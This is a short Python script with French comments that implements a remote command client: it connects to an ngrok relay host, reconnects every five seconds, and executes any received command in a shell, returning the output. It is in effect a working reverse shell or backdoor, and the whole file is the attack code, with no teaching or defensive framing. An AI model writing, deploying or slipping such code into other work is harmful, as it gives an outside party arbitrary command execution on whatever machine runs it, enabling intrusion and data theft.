import socket
import threading
import time
import platform
import subprocess

# -----------------------------
# CONFIGURATION (à modifier)
# -----------------------------
RELAY_HOST = "7.tcp.eu.ngrok.io"  # Adresse Ngrok
RELAY_PORT = 12345                 # Port Ngrok
# -----------------------------

def execute_command(cmd: str) -> str:
    """Exécute les commandes envoyées par le serveur"""
    cmd = cmd.strip()
    if cmd.upper() == "PING":
        return "PONG"
    elif cmd.upper() == "INFO":
        return f"Système : {platform.system()} | Machine : {platform.node()}"
    elif cmd.upper() == "TIME":
        import datetime
        return f"Heure actuelle : {datetime.datetime.now()}"
    elif cmd.upper().startswith("ECHO:"):
        return cmd[5:]
    else:
        try:
            return subprocess.check_output(cmd, shell=True, text=True)
        except Exception as e:
            return f"Erreur : {e}"


def listen_to_server(sock: socket.socket):
    """Écoute les commandes envoyées par le serveur"""
    while True:
        try:
            data = sock.recv(1024)
            if not data:
                break
            cmd = data.decode()
            print(f"[Commande reçue] {cmd}")
            response = execute_command(cmd)
            sock.send(response.encode())
        except Exception:
            break


def connect_to_relay(host: str, port: int) -> socket.socket:
    """Se connecte au relay, réessaie toutes les 5 secondes si échoue"""
    while True:
        try:
            print(f"[INFO] Connexion au relay {host}:{port} …")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("[INFO] Connecté au relay")
            return s
        except Exception as e:
            print(f"[ERROR] Impossible de se connecter, nouvelle tentative dans 5s … {e}")
            time.sleep(5)


def main():
    sock = connect_to_relay(RELAY_HOST, RELAY_PORT)
    listen_to_server(sock)


if __name__ == "__main__":
    main()
